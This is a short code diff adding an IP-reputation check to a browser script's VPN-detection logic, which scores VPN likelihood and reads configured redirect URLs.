@@ -134,6 +134,11 @@
                     vpnIndicators.push("ISP suggests VPN usage");
                 }
 
+                // New addition: IP reputation checks if available
+                if (geoData?.data?.response?.result?.threat?.is_vpn) {
+                    vpnIndicators.push("IP flagged as VPN");
+                }
+
                 const vpnChance = vpnIndicators.length / 4; // Normalize probability
                 const redirectUrl = config.redirect_url?.vpn || "https://example.com";
                 const gobackUrl = new URLSearchParams(window.location.search).get('goback') || "https://example.com";
